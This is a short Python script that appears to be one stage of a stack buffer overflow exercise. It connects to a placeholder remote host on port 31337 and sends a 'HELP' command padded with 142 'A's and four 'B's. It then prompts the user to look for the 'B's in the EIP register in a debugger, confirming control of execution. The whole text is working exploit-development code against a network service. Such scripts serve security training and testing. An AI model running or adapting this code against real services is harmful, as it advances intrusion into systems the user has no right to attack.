#!/usr/bin/python
import sys,socket
from termcolor import colored

cmd = "HELP" # Change this as needed
ip = "<RHOST>" # Change this as needed
port = 31337 # Change this as needed
offset = 142 # Change this as needed
payload = "A" * offset + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	s.send((cmd+payload+'\r\n'))
	s.close()
	print(colored("[+] Payload sent!", "green"))
	print(colored("[*] Check your debugger", "green"))
	print(colored("[*] Look for Bs in the EIP", "green"))
except:
	print(colored("[-] Could not connect...", "red"))
	sys.exit()